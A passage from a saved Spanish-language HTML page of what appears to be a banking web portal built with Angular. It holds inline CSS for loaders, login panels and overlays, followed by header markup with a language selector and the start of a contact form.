        .tokyo_icon.warning[_ngcontent-c47] i[_ngcontent-c47] {
            color: #f57c00
        }

        .tokyo_icon.warning[_ngcontent-c47] .belek-background[_ngcontent-c47] {
            display: none
        }

        .tokyo_icon.success[_ngcontent-c47] i[_ngcontent-c47] {
            color: #00a756
        }

        .tokyo_icon.success[_ngcontent-c47] .belek-background[_ngcontent-c47] {
            display: none
        }

        .tokyo_icon.creditLineProductMode[_ngcontent-c47] .belek-background[_ngcontent-c47] {
            top: 16px;
            left: 8px;
            -webkit-animation: .1s belek-animated-CreditLineMode-reverse;
            animation: .1s belek-animated-CreditLineMode-reverse
        }

        .tokyo_icon.creditLineProductMode[_ngcontent-c47]:hover .belek-background[_ngcontent-c47] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animated-CreditLineMode;
            animation: .1s belek-animated-CreditLineMode
        }

        .tokyo_content.dark[_ngcontent-c47] .tokyo_item[_ngcontent-c47] .tokyo_item_value[_ngcontent-c47] {
            white-space: normal;
            vertical-align: top
        }

        @-webkit-keyframes belek-animated-CreditLineMode {
            0% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated-CreditLineMode {
            0% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animated-CreditLineMode-reverse {
            0% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-CreditLineMode-reverse {
            0% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }
        }
    </style>
<style>
        .ipswich[_ngcontent-c48] {
            width: 940px;
            margin: -54px auto 0;
            border: 1px solid #e1e1e1;
            position: relative;
            background: #fff;
            min-height: 380px;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1)
        }

        .ipswich-advertising[_ngcontent-c48] {
            height: 380px;
            width: 360px
        }

        .ipswich-main-firm-data[_ngcontent-c48] {
            padding: 0 18px
        }

        .ipswich-main-subtitle-description[_ngcontent-c48] {
            font-size: 14px;
            color: #444;
            padding: 5px 0 0
        }

        .error-message[_ngcontent-c48] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            margin: 5px 0 0;
            padding: 0;
            line-height: normal
        }

        .ok-message[_ngcontent-c48] {
            color: green;
            font-weight: 500;
            display: block;
            width: 100%;
            margin: 5px 0 0;
            padding: 0
        }

        .login-utils-link-message[_ngcontent-c48]:hover {
            text-decoration: underline;
            color: #005b75
        }

        .main-container-login-utils[_ngcontent-c48] {
            margin: 10px 0 4px
        }

        .ipswich-main-footer-description[_ngcontent-c48] {
            font-size: 12px;
            color: #444;
            display: inline-block;
            margin-top: 10px
        }

        .ipswich-main-footer-description[_ngcontent-c48] .login-utils-link-message[_ngcontent-c48] {
            display: inline
        }

        @media only screen and (max-width:1023px) and (min-width:768px) {
            .ipswich[_ngcontent-c48] {
                width: 740px;
                margin: -54px auto 0;
                min-height: 0
            }

            .ipswich-advertising[_ngcontent-c48] {
                width: 280px
            }
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .ipswich[_ngcontent-c48] {
                width: 100%;
                margin: 0 auto;
                min-height: 0;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c48] {
                float: none;
                margin: auto
            }
        }

        @media only screen and (max-width:639px) and (min-width:480px) {
            .ipswich[_ngcontent-c48] {
                width: 100%;
                margin: 0 auto;
                min-height: 0;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c48] {
                float: none;
                margin: auto
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .ipswich[_ngcontent-c48] {
                width: 100%;
                margin: 0 auto;
                min-height: 0;
                -webkit-box-shadow: none;
                box-shadow: none
            }

            .ipswich-advertising[_ngcontent-c48] {
                float: none;
                margin: auto
            }
        }

        .login-utils-message[_ngcontent-c48] {
            font-weight: 500;
            display: inline;
            margin: 18px 0 0;
            padding: 0;
            text-align: left;
            color: #444;
            font-size: 12px;
            cursor: pointer
        }

        .login-utils-link-message[_ngcontent-c48] {
            font-weight: 500;
            display: block;
            width: 100%;
            margin: 18px 0 0;
            padding: 0;
            text-align: left;
            color: #0097c1;
            font-size: 12px;
            cursor: pointer
        }

        .main-container-login-utils[_ngcontent-c48] .ipswich-main-footer-description[_ngcontent-c48] {
            padding-bottom: 8px;
            width: 146px
        }

        .ipswich-main-footer-description[_ngcontent-c48] .ipswich-main-footer-description-label[_ngcontent-c48] {
            width: 146px
        }
    </style>
<style>
        .jyvaskyla[_ngcontent-c9] .jyvaskyla-block[_ngcontent-c9] {
            position: relative;
            width: 4em;
            height: 4em;
            margin: auto;
            max-width: 100%;
            max-height: 100%;
            overflow: auto;
            font-size: 10px;
            text-indent: -9999em;
            border-top: .5em solid rgba(255, 255, 255, .2);
            border-right: .5em solid rgba(255, 255, 255, .2);
            border-bottom: .5em solid rgba(255, 255, 255, .2);
            border-left: .5em solid #fff;
            border-radius: 50%;
            -webkit-animation: 1.1s linear infinite load8;
            animation: 1.1s linear infinite load8;
            -webkit-transform: translateZ(0);
            transform: translateZ(0)
        }

        .jyvaskyla[_ngcontent-c9] .jyvaskyla-block[_ngcontent-c9] .jyvaskyla-block-content[_ngcontent-c9] {
            position: fixed;
            display: block;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, .5);
            -webkit-animation: .4s manchesterOverlay;
            animation: .4s manchesterOverlay;
            z-index: 9
        }

        .jyvaskyla[_ngcontent-c9] .jyvaskyla-balls[_ngcontent-c9] div[_ngcontent-c9] {
            display: inline-block;
            width: 6px;
            height: 6px;
            margin: 1px;
            border-radius: 100%;
            background-color: #e1e1e1;
            -webkit-animation: .8s linear infinite turin-balls;
            animation: .8s linear infinite turin-balls
        }

        .jyvaskyla[_ngcontent-c9] .jyvaskyla-balls[_ngcontent-c9] div[_ngcontent-c9]:nth-child(2n-1) {
            -webkit-animation-delay: .33s !important;
            animation-delay: .33s !important
        }

        .jyvaskyla[_ngcontent-c9] .jyvaskyla-default[_ngcontent-c9] {
            position: relative;
            width: 40px;
            height: 60px;
            margin: auto;
            padding: 10px 0
        }

        .jyvaskyla[_ngcontent-c9] .jyvaskyla-default[_ngcontent-c9] .jyvaskyla-default-content[_ngcontent-c9] {
            position: absolute;
            left: 0;
            right: 0;
            width: 4em;
            height: 4em;
            margin: auto;
            font-size: 10px;
            text-indent: -9999em;
            border-top: .5em solid #d1d1d1;
            border-right: .5em solid #d1d1d1;
            border-bottom: .5em solid #d1d1d1;
            border-left: .5em solid #fff;
            border-radius: 50%;
            -webkit-animation: 1.1s linear infinite load8;
            animation: 1.1s linear infinite load8;
            -webkit-transform: translateZ(0);
            transform: translateZ(0)
        }

        .jyvaskyla.pfmLoaderMode[_ngcontent-c9] .jyvaskyla-default[_ngcontent-c9] {
            width: auto;
            height: auto
        }

        .jyvaskyla.pfmLoaderMode[_ngcontent-c9] .jyvaskyla-default[_ngcontent-c9] .jyvaskyla-default-content[_ngcontent-c9] {
            width: 150px;
            height: 150px;
            border-top: 16px solid #d1d1d1;
            border-right: 16px solid #d1d1d1;
            border-bottom: 16px solid #d1d1d1;
            border-left: 16px solid #fff
        }

        .jyvaskyla.overlay[_ngcontent-c9] {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, .5);
            z-index: 9999
        }

        .jyvaskyla.overlay[_ngcontent-c9] .jyvaskyla-block[_ngcontent-c9] {
            width: 3.5em;
            height: 3.5em
        }

        .jyvaskyla.overlay[_ngcontent-c9] .jyvaskyla-default[_ngcontent-c9] {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            width: 36px;
            height: 36px;
            padding: 0
        }

        .jyvaskyla.overlay[_ngcontent-c9] .jyvaskyla-default[_ngcontent-c9] .jyvaskyla-default-content[_ngcontent-c9] {
            width: 3.5em;
            height: 3.5em;
            margin: auto;
            border-top: .6em solid #d1d1d1;
            border-right: .6em solid #d1d1d1;
            border-bottom: .6em solid #d1d1d1;
            border-left: .6em solid #999
        }

        .turin-balls[_ngcontent-c9]>div[_ngcontent-c9] {
            background-color: #e1e1e1;
            width: 6px;
            height: 6px;
            border-radius: 100%;
            margin: 1px;
            display: inline-block;
            -webkit-animation: .8s linear infinite turin-balls;
            animation: .8s linear infinite turin-balls
        }

        .turin-balls[_ngcontent-c9]>div[_ngcontent-c9]:nth-child(2n-1) {
            -webkit-animation-delay: .33s !important;
            animation-delay: .33s !important
        }

        .mesina[_ngcontent-c9] {
            margin: 20% auto 0;
            font-size: 10px;
            position: relative;
            text-indent: -9999em;
            border-top: .5em solid rgba(255, 255, 255, .2);
            border-right: .5em solid rgba(255, 255, 255, .2);
            border-bottom: .5em solid rgba(255, 255, 255, .2);
            border-left: .5em solid #fff;
            -webkit-animation: 1.1s linear infinite load8;
            animation: 1.1s linear infinite load8
        }

        .mesina.dark-item[_ngcontent-c9] {
            border-top: .5em solid #d1d1d1;
            border-right: .5em solid #d1d1d1;
            border-bottom: .5em solid #d1d1d1
        }

        .mesina[_ngcontent-c9],
        .mesina[_ngcontent-c9]:after {
            border-radius: 50%;
            width: 4em;
            height: 4em;
            -webkit-transform: translateZ(0);
            transform: translateZ(0)
        }

        .mesina-default[_ngcontent-c9] {
            position: relative;
            height: 50px;
            margin-right: 25px;
            margin-top: 20px
        }

        .mesina-default[_ngcontent-c9] .mesina.dark-item[_ngcontent-c9] {
            position: absolute;
            left: 0;
            right: 0
        }

        .jyvaskyla-balls[_ngcontent-c9] div[_ngcontent-c9] {
            display: inline-block;
            width: 6px;
            height: 6px;
            margin: 1px;
            border-radius: 100%;
            background-color: #e1e1e1;
            -webkit-animation: .8s linear infinite turin-balls;
            animation: .8s linear infinite turin-balls
        }

        .jyvaskyla-balls[_ngcontent-c9] div[_ngcontent-c9]:nth-child(2n-1) {
            -webkit-animation-delay: .33s !important;
            animation-delay: .33s !important
        }

        .jyvaskyla-default[_ngcontent-c9] {
            position: relative;
            width: 40px;
            height: 60px;
            margin: auto;
            padding: 10px 0
        }

        .jyvaskyla-default[_ngcontent-c9] .jyvaskyla-default-content[_ngcontent-c9] {
            position: absolute;
            left: 0;
            right: 0;
            width: 4em;
            height: 4em;
            margin: auto;
            font-size: 10px;
            text-indent: -9999em;
            border-top: .5em solid #d1d1d1;
            border-right: .5em solid #d1d1d1;
            border-bottom: .5em solid #d1d1d1;
            border-left: .5em solid #fff;
            border-radius: 50%;
            -webkit-animation: 1.1s linear infinite load8;
            animation: 1.1s linear infinite load8;
            -webkit-transform: translateZ(0);
            transform: translateZ(0)
        }

        .pfmLoaderMode[_ngcontent-c9] .mesina-default[_ngcontent-c9] .mesina[_ngcontent-c9] {
            width: 150px;
            height: 150px
        }

        .pfmLoaderMode[_ngcontent-c9] .mesina-default[_ngcontent-c9] .mesina.dark-item[_ngcontent-c9] {
            border-top: 16px solid #d1d1d1;
            border-right: 16px solid #d1d1d1;
            border-bottom: 16px solid #d1d1d1;
            border-left: 16px solid #fff
        }

        .pfmLoaderMode.overlay[_ngcontent-c9] {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, .5);
            z-index: 900
        }

        .pfmLoaderMode.overlay[_ngcontent-c9] .jyvaskyla-block[_ngcontent-c9] {
            width: 3.5em;
            height: 3.5em
        }

        .pfmLoaderMode.overlay[_ngcontent-c9] .jyvaskyla-default[_ngcontent-c9] {
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            width: 36px;
            height: 36px;
            padding: 0
        }

        .pfmLoaderMode.overlay[_ngcontent-c9] .jyvaskyla-default[_ngcontent-c9] .jyvaskyla-default-content[_ngcontent-c9] {
            width: 3.5em;
            height: 3.5em;
            margin: auto;
            border-top: .6em solid #d1d1d1;
            border-right: .6em solid #d1d1d1;
            border-bottom: .6em solid #d1d1d1;
            border-left: .6em solid #999
        }

        .centered[_ngcontent-c9] {
            width: 80px;
            height: 80px;
            position: fixed;
            left: 0;
            top: 0;
            margin: auto;
            max-width: 100%;
            max-height: 100%;
            overflow: auto
        }

        .manchester_overlay[_ngcontent-c9] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 9;
            background: rgba(0, 0, 0, .5);
            opacity: 0
        }

        .manchester_overlay.manchester_overlay-show[_ngcontent-c9] {
            -webkit-animation: .4s manchesterOverlay;
            animation: .4s manchesterOverlay;
            opacity: 1;
            display: block
        }

        .localized_overlay[_ngcontent-c9] {
            position: absolute;
            z-index: 9999;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, .5)
        }

        .localized_overlay[_ngcontent-c9] .mesina.dark-item[_ngcontent-c9] {
            border-top: .6em solid #d1d1d1;
            border-right: .6em solid #d1d1d1;
            border-bottom: .6em solid #d1d1d1;
            border-left: .6em solid #999
        }

        .localized_overlay[_ngcontent-c9] .mesina[_ngcontent-c9],
        .localized_overlay[_ngcontent-c9] .mesina[_ngcontent-c9]:after {
            width: 3.5em;
            height: 3.5em
        }

        .localized_overlay[_ngcontent-c9] .mesina[_ngcontent-c9] {
            margin: 25% auto 0
        }

        .verticalTopMode[_ngcontent-c9] {
            min-height: 60px
        }

        .verticalTopMode[_ngcontent-c9] .mesina-default[_ngcontent-c9] .mesina[_ngcontent-c9] {
            margin-top: -10px
        }

        @-webkit-keyframes load8 {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg)
            }
        }

        @keyframes load8 {
            0% {
                -webkit-transform: rotate(0);
                transform: rotate(0)
            }

            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg)
            }
        }

        @-webkit-keyframes turin-balls {
            50% {
                opacity: .2;
                -webkit-transform: scale3d(.75, .75, 1);
                transform: scale3d(.75, .75, 1)
            }

            100% {
                opacity: 1;
                -webkit-transform: scale3d(1, 1, 1);
                transform: scale3d(1, 1, 1)
            }
        }

        @keyframes turin-balls {
            50% {
                opacity: .2;
                -webkit-transform: scale3d(.75, .75, 1);
                transform: scale3d(.75, .75, 1)
            }

            100% {
                opacity: 1;
                -webkit-transform: scale3d(1, 1, 1);
                transform: scale3d(1, 1, 1)
            }
        }

        @-webkit-keyframes mesina-item {
            0% {
                -webkit-transform: scale3d(0, 0, 0);
                transform: scale3d(0, 0, 0);
                opacity: 0
            }

            5% {
                opacity: 1
            }

            100% {
                -webkit-transform: scale3d(1, 1, 1);
                transform: scale3d(1, 1, 1);
                opacity: 0
            }
        }

        @keyframes mesina-item {
            0% {
                -webkit-transform: scale3d(0, 0, 0);
                transform: scale3d(0, 0, 0);
                opacity: 0
            }

            5% {
                opacity: 1
            }

            100% {
                -webkit-transform: scale3d(1, 1, 1);
                transform: scale3d(1, 1, 1);
                opacity: 0
            }
        }

        @-webkit-keyframes manchesterOverlay {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes manchesterOverlay {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        .mesina-custom[_ngcontent-c9] {
            margin: 20% auto 0;
            font-size: 10px;
            position: relative;
            text-indent: -9999em;
            border-top: .5em solid rgba(255, 255, 255, .2);
            border-right: .5em solid rgba(255, 255, 255, .2);
            border-bottom: .5em solid rgba(255, 255, 255, .2);
            border-left: .5em solid #fff;
            -webkit-animation: 1.1s linear infinite load8;
            animation: 1.1s linear infinite load8
        }

        .mesina-custom.dark-item[_ngcontent-c9] {
            border-top: .5em solid #d1d1d1;
            border-right: .5em solid #d1d1d1;
            border-bottom: .5em solid #d1d1d1;
            margin-top: 25px !important
        }

        .mesina-custom[_ngcontent-c9],
        .mesina-custom[_ngcontent-c9]:after {
            border-radius: 50%;
            width: 4em;
            height: 4em
        }

        .mesina-custom-default[_ngcontent-c9] {
            position: relative;
            height: 50px;
            margin-right: 25px;
            margin-top: 20px
        }

        .mesina-custom-default[_ngcontent-c9] .mesina-custom.dark-item[_ngcontent-c9] {
            position: absolute;
            left: 0;
            right: 0
        }

        .araure-ribbon-item-loader[_ngcontent-c9] {
            width: 100%;
            display: inline-block
        }

        .araure-ribbon-item-loader.jyvaskyla[_ngcontent-c9] .jyvaskyla-balls[_ngcontent-c9] div[_ngcontent-c9] {
            margin-bottom: 8%
        }
    </style>
<style>
        .grid-container[_ngcontent-c53] {
            height: 244px;
            overflow: auto;
            padding: 0;
            margin: 0
        }

        .grid-container[_ngcontent-c53] .grid[_ngcontent-c53] {
            padding-top: 0;
            text-align: center
        }

        .grid-container[_ngcontent-c53] .grid[_ngcontent-c53] .grid-element[_ngcontent-c53] {
            padding: 10px 3px;
            display: inline-block
        }

        .grid-container[_ngcontent-c53] .grid[_ngcontent-c53] .grid-element[_ngcontent-c53] .grid-element-image[_ngcontent-c53] {
            padding: 6px;
            width: 102px
        }

        .grid-container[_ngcontent-c53] .grid[_ngcontent-c53] .grid-element[_ngcontent-c53] .grid-element-image[_ngcontent-c53]:hover img[_ngcontent-c53] {
            border: 1px solid #005b75;
            -webkit-animation: .25s grid-element-image-animation;
            animation: .25s grid-element-image-animation;
            cursor: pointer
        }

        .grid-container[_ngcontent-c53] .grid[_ngcontent-c53] .grid-element[_ngcontent-c53] .grid-element-image.selected[_ngcontent-c53]:hover img[_ngcontent-c53] {
            -webkit-animation: none;
            animation: none;
            border: 3px solid #12447f
        }

        .grid-container[_ngcontent-c53] .grid[_ngcontent-c53] .grid-element[_ngcontent-c53] .grid-element-image.selected[_ngcontent-c53] img[_ngcontent-c53] {
            border: 3px solid #12447f
        }

        .grid-container[_ngcontent-c53] .grid[_ngcontent-c53] .grid-element[_ngcontent-c53] .grid-element-image[_ngcontent-c53] img[_ngcontent-c53] {
            width: 100%;
            border: 1px solid transparent
        }

        @-webkit-keyframes grid-element-image-animation {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #005b75
            }
        }

        @keyframes grid-element-image-animation {
            0% {
                border: 1px solid transparent
            }

            100% {
                border: 1px solid #005b75
            }
        }

        @media screen and (max-width:1023px) and (min-width:768px) {
            .grid-container[_ngcontent-c53] {
                height: 170px
            }

            .grid-container[_ngcontent-c53] .grid[_ngcontent-c53] .grid-element[_ngcontent-c53] .grid-element-image[_ngcontent-c53] {
                width: 70px;
                padding: 0
            }
        }

        @media screen and (max-width:479px) and (min-width:320px) {
            .grid-container[_ngcontent-c53] {
                height: 190px
            }

            .grid-container[_ngcontent-c53] .grid[_ngcontent-c53] .grid-element[_ngcontent-c53] {
                padding: 5px 0
            }

            .grid-container[_ngcontent-c53] .grid[_ngcontent-c53] .grid-element[_ngcontent-c53] .grid-element-image[_ngcontent-c53] {
                width: 76px;
                padding: 2px
            }
        }
    </style>
<style>
        .rimini[_ngcontent-c52] {
            display: table;
            width: 100%;
            vertical-align: middle;
            padding: 20px 0;
            text-align: center;
            font-size: 14px;
            color: #999;
            white-space: normal
        }

        .rimini[_ngcontent-c52] i[_ngcontent-c52] {
            margin-right: 6px;
            display: inline-block
        }

        .rimini.emptyDashboardMessageMode[_ngcontent-c52] {
            font-size: 16px
        }

        .rimini.emptyDashboardMessageMode[_ngcontent-c52] i[_ngcontent-c52] {
            display: none
        }

        .rimini.borderBottom[_ngcontent-c52] {
            border-bottom: 1px solid #e1e1e1
        }

        @media screen and (min-width:768px) {
            .rimini.emptyDashboardMessageMode.positionMiddleMode[_ngcontent-c52] {
                position: absolute;
                top: 30%;
                left: 0;
                right: 0;
                bottom: 0;
                width: 100%
            }
        }
    </style>
<link rel="stylesheet" type="text/css" href="css/prismaWeb.css?v=6.0.939&amp;_=1635530307">
</head>
<body class="generic">
<script>
            window.onload = function() { // también puede usar window.addEventListener('load', (event) => {
              document.getElementById("lodsin").style.display = "none";
            };
          </script>
<icb-app class="app" _nghost-c0="" ng-version="4.4.7">

<div _ngcontent-c0="" class="slough">


<header _ngcontent-c0="">
<div _ngcontent-c0="" class="slough_header" style="height: 200px;">
<icb-publicmasterheader _ngcontent-c0="" _nghost-c2="">
<div _ngcontent-c2="" class="watford">
<div _ngcontent-c2="" class="language_V1 fr hideLanguage">
<icb-language-options _ngcontent-c2="" _nghost-c11="">
<div _ngcontent-c11="" class="crawley">
<span _ngcontent-c11="" class="crawley-pipe-left"></span>
<div _ngcontent-c11="" class="crawley-content">
<a _ngcontent-c11="" class="crawley-content-link " title="Seleccionar idioma" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<span _ngcontent-c11="" class="crawley-content-link-text">Español</span>
<i _ngcontent-c11="" class="crawley-content-icon-mobile">ES</i>
<i _ngcontent-c11="" class="stream-arrow_down_1 crawley-content-icon-arrow"></i>
<div _ngcontent-c11="" class="clearboth"></div>
</a>
<div _ngcontent-c11="" class="crawley-content-link-background"></div>
</div>
<icb-contextual-panel _ngcontent-c11="" height="" pointerlocation="topRight" usemode="contextualMenu" width="250" _nghost-c14="">
<div _ngcontent-c14="" data-hidden="true" class="manchester productSelectorMode      no_footer fullscreen visibility ">
<div _ngcontent-c14="" class="manchester-content">
<div _ngcontent-c14="" class="manchester-content-holder">
<div _ngcontent-c14="" class="manchester-content-holder-indicator"></div>
<div _ngcontent-c14="" class="manchester-content-holder-top" data-hidden="false">
<a _ngcontent-c14="" class="manchester-content-header-link fr" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<svg _ngcontent-c14="" class="svg-remove-circle">
<circle _ngcontent-c14="" cx="10" cy="10" r="9">
</circle>
<line _ngcontent-c14="" x1="14" x2="6" y1="6" y2="14"></line>
<line _ngcontent-c14="" x1="6" x2="14" y1="6" y2="14"></line>
</svg>
</a>
<h6 _ngcontent-c14="">
<header _ngcontent-c11="" class="manchester-content-holder-top " data-contextual-panel-header="1">
Seleccionar idioma
</header>
</h6>
</div>
<div _ngcontent-c14="" class="manchester-content-holder-middle has-title">


<icb-menuoptions _ngcontent-c14="" data-hidden="true">
<div class="oldham">

<div class="oldham_content_panel_start">
<div class="oldham-panel-heading">
<a class="oldham-panel-link oldham-panel-link-activo" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<h4 class="oldham-panel-title">
<span class="oldham-panel-title-icon">
<i></i>
</span>

<span class="oldham-panel-title-text">
English
</span>
<i class="stream-check-12 oldham-panel-title-active-icon"></i>


</h4>
</a>
 
</div>

</div>
<div class="oldham_content_panel_start">
<div class="oldham-panel-heading">
<a class="oldham-panel-link oldham-panel-link-activo" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<h4 class="oldham-panel-title active">
<span class="oldham-panel-title-icon">
<i></i>
</span>

<span class="oldham-panel-title-text">
Español
</span>
<i class="stream-check-12 oldham-panel-title-active-icon"></i>


</h4>
</a>

</div>

</div>
</div>
</icb-menuoptions>
</div>
<div _ngcontent-c14="" class="manchester-content-holder-footer" data-hidden="true">
</div>
</div>
</div>
</div>
</icb-contextual-panel>
</div>
</icb-language-options>
</div>
<div _ngcontent-c2="" class="contact_V1 fr hideContactUs">
<icb-contact-us _ngcontent-c2="" _nghost-c12="">
<div _ngcontent-c12="" class="rotherham ">

<div _ngcontent-c12="">
<span _ngcontent-c12="" class="rotherham-pipe-left"></span>
<a _ngcontent-c12="" class="rotherham-contact-mail">
<i _ngcontent-c12="" class="stream-email-2"></i>
</a>
<div _ngcontent-c12="" class="rotherham-content">
<a _ngcontent-c12="" class="rotherham-content-link" title="Contáctanos" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<span _ngcontent-c12="" class="rotherham-content-link-text">Contáctanos</span>
<i _ngcontent-c12="" class="stream-email-22 rotherham-content-icon-mobile"></i>
<div _ngcontent-c12="" class="clearboth"></div>
</a>
<div _ngcontent-c12="" class="rotherham-content-link-background"></div>
</div>
</div>
<icb-modalpopup _ngcontent-c12="" canceltext="common.cancel" confirmtext="common.confirm" displaymode="contactUsMode" size="medium" _nghost-c5="">

<div _ngcontent-c5="" class="custom-overlay" data-hidden="true" style="z-index: 899;"></div>
<div _ngcontent-c5="" class="parma limitedHeightMode contactUsMode medium" data-hidden="true" style="opacity: 0; z-index: 900;">
<div _ngcontent-c5="" class="parma-content-header">


<div _ngcontent-c5="">
<a _ngcontent-c5="" class="parma-content-header-link fr" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
<svg _ngcontent-c5="" class="svg-remove-circle">
 <circle _ngcontent-c5="" cx="10" cy="10" r="9"></circle>
<line _ngcontent-c5="" x1="14" x2="6" y1="6" y2="14">
</line>
<line _ngcontent-c5="" x1="6" x2="14" y1="6" y2="14">
</line>
</svg>
</a>
<span _ngcontent-c5="" class="parma-content-header-text ">Contáctanos</span>
</div>
</div>

<div _ngcontent-c5="" class="clearboth"></div>
<div _ngcontent-c5="" class="parma-content-block">
<div _ngcontent-c5="" class="parma-content-middle contactUsMode" style="height: auto;">
<div _ngcontent-c5="" class="parma-content-middle-scroll">
<modal-content _ngcontent-c12="">
<icb-form _ngcontent-c12="" displaymode="contactUsMode" formcontrolssize="medium" helpstyle="tooltip" _nghost-c15="">
<form _ngcontent-c15="" autocapitalice="off" autocomplete="off" novalidate="" class="break-0 contactUsMode ng-untouched ng-pristine ng-valid">
<div _ngcontent-c15="" class="venecia-form">

<div _ngcontent-c15="" class="venecia-main-form-required">
<span _ngcontent-c15="" class="venecia-main-form-required-text">Obligatorio</span>
</div>
<icb-record-render _ngcontent-c15="" _nghost-c17="">



<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">


<div _ngcontent-c18="">
<icb-catalog-selector _ngcontent-c18="" displayarrow="true" _nghost-c21="">



<div _ngcontent-c21="" class="venecia-main-box catalogMode form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c21="">
<span _ngcontent-c21="" class="venecia-main-form-label form-break-label formLayoutMode undefined align-top">
Subsidiaria

</span>
<div _ngcontent-c21="" class="venecia-main-form-drop form-break-data medium">
<select _ngcontent-c21="" class="venecia-main-form-select">


</select>

</div>
</div>
</div>
</icb-catalog-selector>
</div>


</div>
</icb-field-render>
</div>
<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">

<icb-textbox _ngcontent-c18="" type="text" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Nombre
completo

</span>
</div>
<div _ngcontent-c22="" class="venecia-main-form-content venecia-position form-break-data ng-untouched ng-pristine ng-valid">

<input _ngcontent-c22="" formcontrolname="controlInput" class="medium venecia-main-form-input required ng-untouched ng-pristine ng-valid" type="text" placeholder="" maxlength="80" tabindex="0" title="" autocomplete="off" name="galletita" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">




</div>
</div>
</icb-textbox>

















</div>
</div>
</div>
</icb-field-render>
</div>
<div _ngcontent-c17="" class="formLayoutMode undefined">





<icb-field-render _ngcontent-c17="" _nghost-c18="">
<div _ngcontent-c18="">




<div _ngcontent-c18="">
<div _ngcontent-c18="">

<icb-textbox _ngcontent-c18="" type="text" _nghost-c22="">



<div _ngcontent-c22="" class="venecia-main-box form-break-content break-0 formLayoutMode undefined  ">


<div _ngcontent-c22="" class="venecia-main-form-label-parent form-break-label">
<span _ngcontent-c22="" class="venecia-main-form-label">
Dirección

<icb-contextual-info _ngcontent-c22="" displaymode="textHelpMode" height="80" icon="stream-help-circle" pointerlocation="topCenter" theme="dark" usemode="contextualPanel" width="210" _nghost-c28="">
<span _ngcontent-c28="" class="tokyo_icon textHelpMode">
 <i _ngcontent-c28="" id="contextualInfoLocalIcon" class="stream-help-circle" style="touch-action: manipulation; user-select: none; -webkit-user-drag: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
</i>
<div _ngcontent-c28="" class="belek-background">
</div>
</span>
<icb-contextual-panel _ngcontent-c28="" _nghost-c14="">
<div _ngcontent-c14="" data-hidden="true" class="manchester productSelectorMode textHelpMode dark   no_header no_footer  visibility ">
<div _ngcontent-c14="" class="manchester-content">
<div _ngcontent-c14="" class="manchester-content-holder">
<div _ngcontent-c14="" class="manchester-content-holder-indicator">
</div>
<div _ngcontent-c14="" class="manchester-content-holder-top" data-hidden="true">
 
<h6 _ngcontent-c14="">
<header _ngcontent-c28="" class="tokyo_header dark">
</header>
</h6>
</div>
<div _ngcontent-c14="" class="manchester-content-holder-middle">

<main-content _ngcontent-c28="">


